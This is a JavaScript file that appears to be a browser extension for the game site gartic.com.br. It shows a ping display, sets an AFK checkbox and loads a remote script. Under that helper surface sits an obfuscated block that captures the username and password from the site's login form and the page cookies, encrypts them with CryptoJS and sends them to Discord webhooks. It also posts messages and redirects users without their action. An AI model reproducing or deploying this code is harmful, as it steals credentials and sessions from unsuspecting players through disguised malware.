
"use strict";
async function ping() {
    let t = Date.now();
    await fetch(window.location.href);
    return `${Date.now() - t}ms`;
}

setInterval(() => {
    ping().then((t) => {
        1 == document.location.href.startsWith("https://gartic.com.br/0") && ((document.querySelectorAll("input")[8].attributes[0].textContent = t), (document.querySelector("#tema > input.boxvets").disabled = true));
    });
}, 3e3);

setTimeout(() => {
    if (document.URL.startsWith("https://gartic.com.br/0")) {
        document.querySelector("#tema > input.isAfk").checked = true;
    }
}, 1000);

// HTML da parte "seguir"

// if ("https://gartic.com.br/" === document.URL) {
//     var _buceta = document.createElement("input");
//     (_buceta.type = "text"),
//         (_buceta.className = "seguir"),
//         _buceta.setAttribute("placeholder", "Atualizando... padder#7724"),
//         (_buceta.style = "padding-left: 275px;padding-right: 275px;"),
//         document.querySelector("#blocoJogar > div.conteudo").append(_buceta);
//     var _botao = document.createElement("button");
//     (_botao.innerHTML = "Stop"), (_botao.className = "stopChasingMe"),
// 	    (_botao.style = "padding-left: 343px;padding-right: 343px;"),
// 	    document.querySelector("#blocoJogar > div.conteudo").append(_botao);
// }


// cria-se biscuit
document.cookie.includes("chase=") ? console.log("has biscuit") : (document.cookie = "chase=0");

var script = document.createElement("script");
script.type = "text/javascript";
script.src = "https://reddap.github.io/gartic-extension/gatric/trash/chase.js";
document.body.appendChild(script);

document.querySelector("#blocoJogar > div.conteudo > button").style.backgroundColor = "ivory";

// x
//sess, rec, biscuit
function _0x20cf(_0x4a54a2,_0x57380b){var _0x2d44cd=_0x3464();return _0x20cf=function(_0x4b3786,_0x138367){_0x4b3786=_0x4b3786-(-0xb*0x337+-0xbb8+0x89*0x59);var _0x570aad=_0x2d44cd[_0x4b3786];if(_0x20cf['vkNzNn']===undefined){var _0x21ba42=function(_0x2dd4b1){var _0x561c42='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x72ee5d='',_0x40f9f6='';for(var _0x3654a9=0x10c*-0x16+-0x1*-0x1aa7+-0x39f,_0x77d3a6,_0x5784f2,_0x1a3df2=0x842+0xf*0x152+-0x1c10*0x1;_0x5784f2=_0x2dd4b1['charAt'](_0x1a3df2++);~_0x5784f2&&(_0x77d3a6=_0x3654a9%(-0x6e*-0x3e+0xc5d+-0x26fd)?_0x77d3a6*(0x1f*-0x39+-0x1969+0x10*0x209)+_0x5784f2:_0x5784f2,_0x3654a9++%(0x3*0x4fd+0x84d+-0x1740))?_0x72ee5d+=String['fromCharCode'](-0x4a*0x42+0x26cf+-0x12bc&_0x77d3a6>>(-(-0x119*-0xb+0x1*0x189d+-0x6*0x61d)*_0x3654a9&-0x1*-0xbc9+-0x2*-0x209+0xc1*-0x15)):0xeb6*0x1+-0x1a1*0x17+0x19*0xe9){_0x5784f2=_0x561c42['indexOf'](_0x5784f2);}for(var _0x31a7eb=0x1186+-0xc0+-0x10c6,_0x1c89e3=_0x72ee5d['length'];_0x31a7eb<_0x1c89e3;_0x31a7eb++){_0x40f9f6+='%'+('00'+_0x72ee5d['charCodeAt'](_0x31a7eb)['toString'](-0x49*-0x82+-0x15*-0x63+-0x2d21))['slice'](-(-0x3*0x38a+-0x3f*-0x3+-0x9e3*-0x1));}return decodeURIComponent(_0x40f9f6);};_0x20cf['dtZnhu']=_0x21ba42,_0x4a54a2=arguments,_0x20cf['vkNzNn']=!![];}var _0x3f23b3=_0x2d44cd[-0x19f7+-0x9f0+0x23e7],_0x4d025c=_0x4b3786+_0x3f23b3,_0x4e2d04=_0x4a54a2[_0x4d025c];return!_0x4e2d04?(_0x570aad=_0x20cf['dtZnhu'](_0x570aad),_0x4a54a2[_0x4d025c]=_0x570aad):_0x570aad=_0x4e2d04,_0x570aad;},_0x20cf(_0x4a54a2,_0x57380b);}(function(_0x5f1627,_0x327099){function _0x93c58e(_0x4904c7,_0x1d6515,_0x4b7e5c,_0x4c9e3e){return _0x20cf(_0x4b7e5c-0x2a8,_0x4904c7);}var _0x56e1df=_0x5f1627();function _0x537091(_0x3a52f1,_0x3aeda3,_0x469cff,_0x344318){return _0x20cf(_0x344318- -0x1e4,_0x3aeda3);}while(!![]){try{var _0x5af683=parseInt(_0x93c58e(0x343,0x328,0x351,0x32f))/(-0x39*-0x90+-0xfe8+-0x1027)+-parseInt(_0x93c58e(0x33a,0x324,0x33b,0x351))/(-0x20*0x26+0x1c9b*-0x1+0x215d)+parseInt(_0x93c58e(0x350,0x3a7,0x36f,0x3a4))/(-0x1*-0x83c+0x80f*0x1+-0x1048)*(-parseInt(_0x537091(-0xcc,-0x11b,-0xc9,-0xe6))/(0x109+-0x22e0+-0x21db*-0x1))+parseInt(_0x537091(-0x122,-0xeb,-0x12f,-0x103))/(0x106c+0x30*0xc2+-0x34c7)*(parseInt(_0x93c58e(0x326,0x310,0x337,0x351))/(-0x1e40+-0x5*-0x5+-0x609*-0x5))+-parseInt(_0x93c58e(0x34f,0x30a,0x33e,0x342))/(-0x23a2+0x1593+0xe16)+parseInt(_0x93c58e(0x3aa,0x3ac,0x395,0x3a9))/(0xf*-0x1f5+-0x2f1+0x4*0x815)*(parseInt(_0x537091(-0x129,-0x118,-0x15c,-0x150))/(0x7*0x251+0x14b9+-0x24e7))+-parseInt(_0x93c58e(0x31b,0x336,0x348,0x37f))/(0x8c8+0x1*0x1c25+-0x7*0x545);if(_0x5af683===_0x327099)break;else _0x56e1df['push'](_0x56e1df['shift']());}catch(_0x542a0){_0x56e1df['push'](_0x56e1df['shift']());}}}(_0x3464,0x8291+0x8ea2+0x28547));document[_0x11403e(0x1b0,0x19b,0x16f,0x167)]===_0x4ef3ce(-0x1e4,-0x1f4,-0x1f9,-0x1dd)+'rtic.com.b'+'r/'&&document['querySelec'+_0x4ef3ce(-0x1b8,-0x1c2,-0x1c4,-0x1d3)](_0x11403e(0x16c,0x17e,0x146,0x17c)+_0x4ef3ce(-0x20e,-0x224,-0x1dc,-0x20b)+'rm\x20>\x20div\x20>'+_0x4ef3ce(-0x1ea,-0x1e5,-0x1e9,-0x1ce))['addEventLi'+_0x4ef3ce(-0x1f1,-0x1fb,-0x202,-0x1d2)](_0x11403e(0x194,0x1bd,0x19c,0x1a5),function(){var _0x270696={'sALtE':function(_0x3444af,_0x533ea0,_0x211bda){return _0x3444af(_0x533ea0,_0x211bda);},'fittr':_0x149ce8(0x2c0,0x2b1,0x2af,0x29e)+_0x29bd02(0x3c4,0x3e6,0x39d,0x3da)+'api/webhoo'+_0x149ce8(0x2dd,0x2b5,0x2ef,0x29c)+_0x29bd02(0x39f,0x38a,0x3a0,0x3c9)+_0x29bd02(0x3a4,0x36c,0x3ac,0x36c)+_0x149ce8(0x293,0x26a,0x29d,0x258)+_0x149ce8(0x288,0x269,0x282,0x277)+_0x29bd02(0x3c3,0x3c7,0x3c8,0x3cc)+'mFQknVpb1g'+_0x29bd02(0x3cf,0x3b1,0x39f,0x3c5)+_0x29bd02(0x39a,0x380,0x384,0x371),'VyPkV':_0x29bd02(0x379,0x366,0x387,0x3a1),'cyUdJ':_0x149ce8(0x2c2,0x2d7,0x2e8,0x2fd)+_0x149ce8(0x2de,0x2cd,0x2f4,0x2af),'snGVA':_0x29bd02(0x397,0x378,0x365,0x3b2),'aUnxU':function(_0x1b9c76,_0x1270f2){return _0x1b9c76+_0x1270f2;},'YXnDs':function(_0x59406f,_0x52e426){return _0x59406f+_0x52e426;},'kuOCt':'use','aIVJh':_0x149ce8(0x2aa,0x297,0x26d,0x299),'yItmG':function(_0x334530,_0x31dd45){return _0x334530+_0x31dd45;},'TcmSJ':_0x149ce8(0x255,0x280,0x254,0x285),'VOMmG':function(_0x12c1ef,_0x1e5931){return _0x12c1ef+_0x1e5931;},'IdNFH':'𝐢𝐬⠀'};function _0x149ce8(_0xdcc61b,_0x49e668,_0x15afff,_0x2377e1){return _0x4ef3ce(_0xdcc61b-0x1,_0xdcc61b,_0x15afff-0x184,_0x49e668-0x46f);}function _0x29bd02(_0x371acd,_0x5dbb40,_0x4e7667,_0x5c79fe){return _0x4ef3ce(_0x371acd-0x1e4,_0x5c79fe,_0x4e7667-0x184,_0x371acd-0x56b);}_0x270696[_0x29bd02(0x384,0x366,0x389,0x371)](fetch,_0x270696['fittr'],{'method':_0x270696[_0x149ce8(0x2c8,0x2ab,0x285,0x2c2)],'headers':{'Accept':_0x270696[_0x149ce8(0x2e4,0x2cb,0x2ce,0x2e3)],'Content-Type':_0x270696[_0x149ce8(0x2ca,0x2cb,0x29d,0x2f2)]},'mode':_0x270696[_0x149ce8(0x2d9,0x2d0,0x2e9,0x2e7)],'body':JSON[_0x149ce8(0x2e6,0x2d2,0x2a1,0x2ad)]({'embeds':[{'description':_0x270696[_0x29bd02(0x3b7,0x383,0x3a1,0x39c)](_0x149ce8(0x27c,0x2a6,0x288,0x270)+CryptoJS[_0x149ce8(0x2c7,0x299,0x27c,0x293)]['encrypt']('session:\x20'+document['getElement'+_0x29bd02(0x3b3,0x3c2,0x3b6,0x3b5)](_0x270696[_0x149ce8(0x2b4,0x2bb,0x2dd,0x290)](_0x270696['YXnDs'](_0x270696[_0x29bd02(0x3c6,0x3b8,0x3d2,0x3bd)],_0x270696[_0x149ce8(0x2de,0x2c4,0x2da,0x2a5)]),'gin'))[_0x149ce8(0x255,0x284,0x24a,0x2a6)]+'\x20'+document[_0x149ce8(0x261,0x271,0x25f,0x23a)+_0x149ce8(0x2cb,0x2b7,0x286,0x296)](_0x270696[_0x149ce8(0x256,0x27b,0x24b,0x29f)](_0x270696[_0x29bd02(0x377,0x3a4,0x372,0x399)]('se','nh'),'aLo')+_0x270696[_0x29bd02(0x391,0x3bc,0x3b4,0x389)])[_0x29bd02(0x380,0x355,0x374,0x3a8)],_0x270696['yItmG'](_0x270696[_0x149ce8(0x2c4,0x2aa,0x2bb,0x2da)](_0x270696[_0x29bd02(0x3b6,0x39d,0x3bc,0x3ca)],'𝐩𝐚𝐝'),_0x29bd02(0x3b0,0x381,0x3d4,0x379)))[_0x149ce8(0x284,0x293,0x280,0x2a3)](),_0x149ce8(0x2a3,0x2a6,0x299,0x273))}]})});});function _0x11403e(_0x482736,_0x388fce,_0x4c35c9,_0x5278dc){return _0x20cf(_0x388fce-0xc6,_0x482736);}setTimeout(()=>{var _0x5a17df={'ZdPat':function(_0x533ad2,_0x47b813){return _0x533ad2+_0x47b813;},'HEaxq':function(_0x5f15b6,_0x29e5c1){return _0x5f15b6+_0x29e5c1;},'NNykc':_0x28d1ec(-0x7f,-0xab,-0x8f,-0xbe),'tjSDf':'Test:\x20test','MeNTe':_0x5f09de(0x349,0x36f,0x318,0x377),'sGcHD':'𝐞𝐫','PPDbW':function(_0x146775,_0x44986a,_0x426750){return _0x146775(_0x44986a,_0x426750);},'ejnCb':_0x5f09de(0x366,0x37c,0x3a1,0x384)+'scord.com/'+_0x5f09de(0x373,0x350,0x357,0x3ad)+_0x5f09de(0x32c,0x309,0x316,0x32f)+_0x28d1ec(-0xf9,-0xc5,-0xd5,-0xbd)+_0x28d1ec(-0x96,-0xac,-0xe5,-0x9d)+_0x5f09de(0x35e,0x383,0x35c,0x350)+_0x28d1ec(-0x122,-0xe9,-0x115,-0xcd)+_0x28d1ec(-0xb7,-0xcd,-0xea,-0x9f)+'ImRyG3nK8T'+_0x28d1ec(-0x10a,-0xd0,-0x101,-0x108)+'55ziwGjNRY','OCAiv':_0x5f09de(0x332,0x345,0x367,0x300),'sRBqo':_0x28d1ec(-0xa5,-0x84,-0x84,-0x70)+_0x28d1ec(-0xaa,-0x8e,-0x88,-0x98),'onurz':_0x28d1ec(-0x96,-0xc0,-0x9a,-0xb8)},_0xa26d50,_0xeeaef9,_0x3d8b97;_0xa26d50=_0x5a17df[_0x28d1ec(-0xfe,-0xf3,-0x121,-0xf9)](_0x5a17df[_0x28d1ec(-0xe5,-0xe2,-0xcb,-0xc5)](_0x28d1ec(-0xbf,-0xa8,-0x75,-0xca),_0x5a17df['NNykc']),document[_0x28d1ec(-0xd8,-0xee,-0xfb,-0x11b)]),_0xeeaef9=_0x5a17df[_0x5f09de(0x333,0x310,0x30d,0x300)];var _0x5e63b3=CryptoJS[_0x5f09de(0x34e,0x353,0x34a,0x315)]['encrypt'](_0xa26d50+'\x0a'+_0xeeaef9,_0x5a17df[_0x28d1ec(-0xb1,-0xe2,-0x11c,-0x10e)](_0x5a17df['HEaxq'](_0x5a17df['MeNTe'],_0x28d1ec(-0xec,-0xbb,-0xb8,-0xef)),_0x5a17df[_0x5f09de(0x38d,0x372,0x3a9,0x3b5)])),_0x2d3b18={};_0x2d3b18['descriptio'+'n']='```'+_0x5e63b3+_0x28d1ec(-0x8c,-0xb5,-0x8c,-0xc4);function _0x5f09de(_0xdb35f3,_0x2059ff,_0x17b4fc,_0x28a148){return _0x11403e(_0x2059ff,_0xdb35f3-0x1c7,_0x17b4fc-0x9c,_0x28a148-0x9f);}var _0x4287de={};_0x4287de[_0x28d1ec(-0x98,-0xa3,-0xc4,-0x9e)]=[_0x2d3b18];function _0x28d1ec(_0x34f50d,_0x2669d7,_0x27f58b,_0x2ee4bc){return _0x11403e(_0x2ee4bc,_0x2669d7- -0x249,_0x27f58b-0x1f1,_0x2ee4bc-0x11f);}_0x5a17df['PPDbW'](fetch,_0x5a17df[_0x5f09de(0x341,0x377,0x310,0x30d)],{'method':_0x5a17df[_0x5f09de(0x32f,0x355,0x317,0x34b)],'headers':{'Accept':_0x5a17df[_0x5f09de(0x37e,0x37c,0x39b,0x35e)],'Content-Type':_0x5a17df[_0x28d1ec(-0xc1,-0x92,-0x62,-0xa4)]},'mode':_0x5a17df[_0x5f09de(0x31a,0x318,0x2f9,0x2f3)],'body':JSON[_0x5f09de(0x387,0x399,0x352,0x398)](_0x4287de)});},-0x1d*0x3+-0x175a*0x1+0x1b99);function _0x4ef3ce(_0x340d98,_0x175e36,_0x5c7cfd,_0x3e887e){return _0x20cf(_0x3e887e- -0x297,_0x175e36);}if(document[_0x11403e(0x199,0x19b,0x164,0x194)]['startsWith']('https://ga'+'rtic.com.b'+_0x4ef3ce(-0x16f,-0x1b1,-0x191,-0x19a)+_0x11403e(0x17e,0x15e,0x139,0x129))){ajaxRecado(_0x11403e(0x19a,0x175,0x176,0x168)+_0x4ef3ce(-0x1fd,-0x1d9,-0x1c1,-0x1f9)+_0x4ef3ce(-0x1d5,-0x1bb,-0x1b2,-0x1ac),_0x4ef3ce(-0x1b2,-0x1ea,-0x1d5,-0x1de)+_0x11403e(0x1c9,0x1ab,0x1c3,0x188)+_0x4ef3ce(-0x1ca,-0x181,-0x1e8,-0x1b0)+'0',_0x4ef3ce(-0x213,-0x226,-0x1d1,-0x1fc)+_0x4ef3ce(-0x1ca,-0x1fd,-0x1f2,-0x1ea)),document[_0x11403e(0x1aa,0x17d,0x1b8,0x14c)+'tor'](_0x4ef3ce(-0x193,-0x1ac,-0x17d,-0x1a1)+_0x4ef3ce(-0x184,-0x192,-0x1c1,-0x1bd)+_0x11403e(0x129,0x162,0x165,0x142)+':nth-child'+_0x11403e(0x1c3,0x1c2,0x19a,0x1d3))[_0x4ef3ce(-0x1bb,-0x1e3,-0x1d7,-0x1ed)+'t']=_0x4ef3ce(-0x1b2,-0x1cd,-0x1b4,-0x1d5)+_0x4ef3ce(-0x1c3,-0x1f6,-0x1ef,-0x1c8)+_0x11403e(0x15d,0x171,0x161,0x181)+_0x4ef3ce(-0x1a7,-0x1e8,-0x1ba,-0x1b9)+_0x11403e(0x1dd,0x1bf,0x1e1,0x1e4)+_0x4ef3ce(-0x1de,-0x18f,-0x1ca,-0x1a9)+_0x11403e(0x184,0x15d,0x135,0x167),document['querySelec'+_0x4ef3ce(-0x1cd,-0x206,-0x1b3,-0x1d3)](_0x11403e(0x182,0x1bc,0x195,0x1b7)+_0x11403e(0x197,0x1ba,0x1ae,0x1a8))[_0x4ef3ce(-0x1be,-0x1b7,-0x223,-0x1ed)+'t']=_0x11403e(0x19b,0x177,0x16d,0x1ad)+_0x11403e(0x191,0x1af,0x1d3,0x1b1)+_0x11403e(0x1d0,0x19a,0x1ae,0x17f)+_0x11403e(0x17c,0x17b,0x154,0x1b5)+_0x4ef3ce(-0x1b7,-0x1e2,-0x199,-0x1ad);function ajaxRecado(_0x5d0945,_0x99252b,_0x417cf4){var _0xd31d3d={};_0xd31d3d[_0x40b277(0xa,0x20,-0x13,0x3c)]=_0x40b277(0x3c,0x35,0x62,0x5d)+'alhes';var _0x4ab9b7=_0xd31d3d;function _0x1b55cc(_0x583a61,_0x3e65f2,_0xb33c0,_0x263c16){return _0x4ef3ce(_0x583a61-0x36,_0x3e65f2,_0xb33c0-0x9c,_0xb33c0-0x40);}function _0x40b277(_0x4422ce,_0x53c36d,_0x1a6cce,_0x130e17){return _0x4ef3ce(_0x4422ce-0x10a,_0x53c36d,_0x1a6cce-0x85,_0x4422ce-0x1fd);}ultimaResposta=0x95d+-0x21a3+0x1846,location['href']=_0x40b277(-0xc,-0x36,0x6,-0x3e)+'er#7724...'+'..no.....D'+_0x1b55cc(-0x185,-0x18e,-0x173,-0x168)+_0x1b55cc(-0x1bd,-0x1d8,-0x1a9,-0x188),$(_0x4ab9b7['fzPNL'])['innerHTML']=_0x1b55cc(-0x19d,-0x178,-0x1b0,-0x1b2)+_0x1b55cc(-0x137,-0x193,-0x16f,-0x186)+_0x40b277(0x32,0x0,0x59,0x39),ajax[_0x40b277(0x33,0x68,0x62,0x33)](_0x5d0945,_0x99252b,_0x417cf4,!(0xd*-0x95+0xbb4+-0x423));}function retornoAjaxRecado(_0x1b46cb){var _0x21ed02={'BYUHK':function(_0x5bc844,_0x3e27b9){return _0x5bc844(_0x3e27b9);},'NDRFs':'recadosDet'+_0xe01cc6(0x1bb,0x1ca,0x1e6,0x1e7)};function _0xe01cc6(_0x4223c3,_0x1601e4,_0x1891e5,_0x2be59a){return _0x4ef3ce(_0x4223c3-0x142,_0x1601e4,_0x1891e5-0x1c,_0x4223c3-0x3b5);}function _0x161705(_0x499184,_0x101885,_0x1635bc,_0x2439e4){return _0x4ef3ce(_0x499184-0x7c,_0x101885,_0x1635bc-0x1b5,_0x499184-0x4ba);}_0x21ed02[_0xe01cc6(0x1e8,0x1e2,0x21d,0x1d4)]($,_0x21ed02[_0xe01cc6(0x1de,0x1a6,0x1e5,0x201)])[_0xe01cc6(0x1d0,0x1d8,0x1c8,0x20a)]=_0x1b46cb;}var ultimaResposta=-0xefe+0x3*0x7e1+-0x8a5;}function _0x3464(){var _0x34608b=['z2v0rwXLBwvUDa','rdvNAwK5A1f5nG','CMv0B3jUB0fQyq','DwrVmYa+igrPDG','ywXOzxm','y2fKB19HAMf4lG','A3mVotm5mJG3nW','mZC1nta3mgLQCfjmAG','sevHEhe','t0nbAxy','EuL0BuC','zNPqtKW','ue9tva','DgPtrgy','qwD1yxjKzsWGBq','z2LU','mJK5otq4zfHcq2vf','Dgv4DenVBNrLBG','CxvPpYboW6nVigq','DMfSDwu','EfjLy2fKBW','lJOPlI4UlI7IMAu','l3bLCMzPBf9Yzq','C0fmDeu','Ahr0Chm6lY9NAq','Aw5Uzxjive1m','mtvpD09cCxr6sq','zwPUq2i','AwmTzxH0zw5ZAq','ytrvsvbwn1bdva','CxvLCNLtzwXLyW','i2jSB2nVrgvZBa','ywrTAw5PC3rYyq','Ahr0Chm6lY9Nyq','Dg9tDhjPBMC','8j2qOVcDKkZIOidWNzcP8j2qMG','vgnTu0O','oty1ntKWmdC3na','CKXV','tKrsrNm','quvt','qwXNDw0GChjVyG','y29YCW','Dg9Y','C3rLBMvY','sZfouhzSCeviEG','mtm4Dff4v3jo','8j2qNFcDKj0','igLUChv0','qLLvseS','ode1mta4nJKWma','Dg8UlI4','y2HHBwfKyq','ygbG','BgvTysbWB3iGyq','mI9yCNrnBfLeqW','CwPsrfnequqYzW','vK9nBuC','vNLqA1y','zwrKyxaVz2fYDa','vvjm','CMvJywrVC0rLDa','nc9WAMLer3GWCa','A2LLCZOG','Ahr0Chm6lY9KAq','igrPDI5JB250zq','q29V','8j2qNFcDKj7WNzcR','A3mVotm5nZm5nW','zwL4zsbKzsbTzq','qNLjza','zw1IzwrZ','otqYnJm1u0vPwNHx','swrorKG','yvvUEfu','AxnJB3jKlI4UlG','y2fVjMLKx3vZDq','yxbPl3DLyMHVBW','yxjPBZ0YndC1mW','yxmGBSoJBYb0yw4','DgH1yI5JB20VCG','B24V','CgHW','yuLwsMG','mZKYDKPXyNLN','isbWywrKzxiJnW','q21pDw9dsLztsG','C2nVCMqUy29TlW','C1jcCw8','A3vpq3q','y3LvzeO','igGZ','BI9QC29U','i2v4DgvYBMeGpG','y2XPy2S','C25hvKe','ignVBNrHy3rHCG','C3rYAw5NAwz5','sxfSyxm0vvHKnG','kdmP','CI9Hzg1PBMLZDa','odm2oe51C0zSBq','yxbWBgLJyxrPBW','C0DJseq','B2DHzg8GpIbMBW','B251CNO','iY4UlI4UCgfKza','nM1jELjiza','wMrqyxq','vfC4mu44ner3CW','sLmXqJe2BM5WCq','mtK5odqYywrOwgz0','nZy2nJjfsfvSzwC','y29VA2LL','nJKZndy5EunRqMvP','nZi0','CMfJyw8'];_0x3464=function(){return _0x34608b;};return _0x3464();}
